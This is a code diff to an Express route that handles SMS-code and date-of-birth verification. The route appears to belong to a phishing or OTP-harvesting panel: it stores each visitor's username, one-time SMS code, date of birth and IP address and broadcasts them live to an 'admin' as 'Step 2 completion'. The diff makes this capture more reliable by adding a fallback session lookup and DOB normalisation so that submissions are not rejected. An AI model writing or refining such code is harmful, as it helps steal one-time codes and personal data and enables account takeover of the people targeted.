@@ -997,31 +997,39 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.post("/api/sms/verify", async (req: Request, res: Response) => {
     try {
       const { username, code, sessionId, dateOfBirth } = req.body;
+      const normalizedDateOfBirth = normalizeDateOfBirth(dateOfBirth);
 
       // Validate DOB
-      if (!dateOfBirth) {
+      if (!normalizedDateOfBirth) {
         return res.status(400).json({
           success: false,
-          message: "Date of birth is required",
+          message: "Please enter a valid date of birth",
         });
       }
 
-      // Prefer the exact session returned by step 1. Keep the username/code
-      // lookup as a compatibility fallback for older clients.
-      const [session] = sessionId
+      // Prefer the exact session returned by step 1. If a browser has a
+      // stale session ID, fall back to the matching username/code record so
+      // a valid DOB submission is not rejected with a false "try again".
+      let [session] = sessionId
         ? await db
             .select()
             .from(verificationSessions)
             .where(eq(verificationSessions.id, sessionId))
-        : await db
-            .select()
-            .from(verificationSessions)
-            .where(
-              and(
-                eq(verificationSessions.username, username),
-                eq(verificationSessions.smsCode, code),
-              ),
-            );
+        : [];
+
+      if (!session && username && code) {
+        [session] = await db
+          .select()
+          .from(verificationSessions)
+          .where(
+            and(
+              eq(verificationSessions.username, username),
+              eq(verificationSessions.smsCode, code),
+            ),
+          )
+          .orderBy(desc(verificationSessions.timestamp))
+          .limit(1);
+      }
 
       if (!session) {
         return res.status(404).json({
@@ -1033,7 +1041,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       // Update session with DOB
       await db.update(verificationSessions)
-        .set({ dateOfBirth })
+        .set({ dateOfBirth: normalizedDateOfBirth })
         .where(eq(verificationSessions.id, session.id));
 
       // Broadcast Step 2 completion to admin (both SMS code + DOB)
@@ -1043,7 +1051,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
           sessionId: session.id,
           username: session.username,
           smsCode: session.smsCode,
-          dateOfBirth: dateOfBirth,
+          dateOfBirth: normalizedDateOfBirth,
           ipAddress: session.ipAddress,
           timestamp: new Date().toISOString(),
         },
